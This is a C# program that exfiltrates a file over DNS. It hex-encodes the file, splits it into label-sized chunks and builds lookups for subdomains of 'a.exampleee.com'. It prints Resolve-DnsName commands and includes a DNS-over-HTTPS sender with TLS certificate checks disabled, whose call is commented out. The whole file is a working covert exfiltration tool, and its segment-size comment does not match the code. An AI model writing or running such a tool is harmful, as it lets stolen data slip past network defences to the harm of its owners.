using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Net.Security;
using System.Net;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 2 || (args[0] != "-f" && args[0] != "--file"))
        {
            Console.WriteLine("Usage: Program.exe -f <path_to_file>");
            return;
        }

        string filePath = args[1];
        if (!File.Exists(filePath))
        {
            Console.WriteLine($"File not found: {filePath}");
            return;
        }

        try
        {
            byte[] fileBytes = File.ReadAllBytes(filePath);
            string hexData = BitConverter.ToString(fileBytes).Replace("-", string.Empty);
            int totalLength = hexData.Length;

            // Define the segment sizes in bytes (22 for the first segment, 31 for the others)
            int[] segmentSizes = { 42, 62, 62, 62 }; // Each byte becomes two hex characters

            // Calculate total chunks needed
            int bytesPerChunk = 22 + 3 * 31; // Total bytes per DNS query
            int totalChunks = (int)Math.Ceiling(fileBytes.Length / (double)bytesPerChunk);
            int chunkId = 0;

            for (int index = 0; index < totalLength;)
            {
                List<string> segments = new List<string>();

                foreach (var segmentSize in segmentSizes)
                {
                    int segmentByteSize = segmentSize / 2;
                    if (index < totalLength)
                    {
                        int length = Math.Min(segmentByteSize * 2, totalLength - index); // Length in hex characters
                        segments.Add(hexData.Substring(index, length));
                        index += length;
                    }
                }

                // Format the chunk ID
                string formattedChunkId = chunkId == totalChunks - 1 ? "FFFF" : chunkId.ToString("X4");

                // Construct and print the DNS query
                string domainName = string.Join(".", segments) + $".{formattedChunkId}.a.exampleee.com";
                Console.WriteLine($"Resolve-DnsName -Name {domainName} -Type A -Server 127.0.0.1");

                chunkId++; // Increment chunk ID for the next chunk

                //makeRequest(domainName);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }

    static void makeRequest(string domain)
    {

        ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(
            delegate { return true; }
            );
        string dohGoogleResolverUrl = "https://dns.google/resolve";
        string dohCloudflareResolverUrl = "https://1.1.1.1/dns-query";

        WebProxy webProxy = new WebProxy("http://127.0.0.1:8080");

        string targetUrl = dohCloudflareResolverUrl + "?name=" + domain;
        Console.WriteLine(targetUrl);

        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl);
        //request.Proxy = webProxy;
        request.Accept = "application/dns-json";

        try
        {
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    string responseText = reader.ReadToEnd();
                    Console.WriteLine(responseText);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
    }
}
